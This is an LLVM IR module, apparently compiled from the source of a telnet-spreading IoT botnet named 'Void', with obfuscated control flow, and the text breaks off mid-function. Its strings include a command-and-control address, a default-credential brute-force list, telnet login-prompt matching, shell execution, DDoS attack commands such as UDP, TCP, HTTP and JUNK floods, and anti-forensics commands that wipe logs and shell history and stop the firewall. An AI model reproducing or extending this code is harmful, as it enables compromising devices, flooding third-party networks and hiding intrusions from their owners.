; ModuleID = 'host/ir_bcf/Void.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [14 x i8] c"PAYLOADZZZZ\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"IP:23\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.31 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.112 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.40 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.43 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.45 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.47 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"sername:\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.55 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.56 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.59 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.63 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.66 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.68 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.71 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.72 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.74 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.85 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.87 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.88 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.90 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.91 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.93 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.94 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.95 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.96 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"DONGS\00", align 1
@.str.99 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.100 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"sshd\00", align 1
@.str.102 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.108 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %47, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %50

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* @x
  %15 = load i32, i32* @y
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i32, i32* %3, align 4
  %23 = sub nsw i32 %22, 3
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %24
  %26 = load i32, i32* %25, align 4
  %27 = load i32, i32* %3, align 4
  %28 = sub nsw i32 %27, 2
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = xor i32 %26, %31
  %33 = xor i32 %32, -1640531527
  %34 = load i32, i32* %3, align 4
  %35 = xor i32 %33, %34
  %36 = load i32, i32* %3, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  store i32 %35, i32* %38, align 4
  %39 = load i32, i32* @x
  %40 = load i32, i32* @y
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %10

; <label>:50:                                     ; preds = %10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %13
  %51 = load i32, i32* %3, align 4
  %_ = sub i32 %51, 3
  %gen = mul i32 %_, 3
  %_1 = sub i32 %51, 3
  %gen2 = mul i32 %_1, 3
  %_3 = sub i32 %51, 3
  %gen4 = mul i32 %_3, 3
  %_5 = sub i32 0, %51
  %gen6 = add i32 %_5, 3
  %52 = sub nsw i32 %51, 3
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = load i32, i32* %3, align 4
  %_7 = sub i32 0, %56
  %gen8 = add i32 %_7, 2
  %_9 = shl i32 %56, 2
  %_10 = sub i32 0, %56
  %gen11 = add i32 %_10, 2
  %_12 = sub i32 %56, 2
  %gen13 = mul i32 %_12, 2
  %57 = sub nsw i32 %56, 2
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %58
  %60 = load i32, i32* %59, align 4
  %61 = xor i32 %55, %60
  %_14 = sub i32 0, %61
  %gen15 = add i32 %_14, -1640531527
  %_16 = shl i32 %61, -1640531527
  %_17 = sub i32 0, %61
  %gen18 = add i32 %_17, -1640531527
  %_19 = sub i32 %61, -1640531527
  %gen20 = mul i32 %_19, -1640531527
  %62 = xor i32 %61, -1640531527
  %63 = load i32, i32* %3, align 4
  %_21 = sub i32 %62, %63
  %gen22 = mul i32 %_21, %63
  %_23 = sub i32 0, %62
  %gen24 = add i32 %_23, %63
  %_25 = shl i32 %62, %63
  %_26 = sub i32 %62, %63
  %gen27 = mul i32 %_26, %63
  %_28 = sub i32 0, %62
  %gen29 = add i32 %_28, %63
  %_30 = sub i32 %62, %63
  %gen31 = mul i32 %_30, %63
  %_32 = sub i32 %62, %63
  %gen33 = mul i32 %_32, %63
  %64 = xor i32 %62, %63
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  store i32 %64, i32* %67, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* @x.1
  %31 = load i32, i32* @y.2
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %3, align 4
